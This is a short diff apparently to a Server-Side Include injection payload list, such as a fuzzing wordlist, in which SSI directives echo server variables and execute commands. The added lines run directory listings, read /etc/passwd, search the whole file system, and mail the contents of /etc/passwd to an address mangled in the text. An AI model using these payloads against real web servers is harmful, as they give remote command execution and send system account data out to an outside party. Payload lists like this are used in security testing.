@@ -27,6 +27,7 @@
 <!--#echo var="http_ua_cpu" -->
 <!--#echo var="http_ua_os" -->
 <!--#echo var="http_user_agent" -->
+
 <!--#echo var="last_modified" -->
 <!--#echo var="netsite_root" -->
 <!--#echo var="page_count" -->
@@ -76,3 +77,7 @@
 <pre><!--#exec cmd="dir" --></pre>
 <pre><!--#exec cmd="ls" --></pre>
 <pre><!--#exec cmd="whoami"--></pre>
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>
